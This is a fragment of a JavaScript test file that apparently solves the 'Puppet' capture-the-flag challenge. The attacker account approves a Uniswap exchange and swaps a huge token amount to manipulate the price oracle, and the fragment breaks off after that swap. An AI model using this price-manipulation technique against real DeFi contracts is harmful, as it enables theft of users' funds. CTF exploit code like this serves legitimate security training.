...
describe("[Challenge] Puppet", function () {
    ...
    it("Exploit", async function () {
        ...
        [deployer, attacker] = await ethers.getSigners();
        const userBalance = await this.token.balanceOf(attacker.address);
        console.log(userBalance.toString())

        await this.token.connect(attacker).approve(this.uniswapExchange.address, userBalance);
        await this.uniswapExchange
            .connect(attacker)
            .tokenToEthSwapInput('999999999999999999990', 1, Date.now() + 10000000);
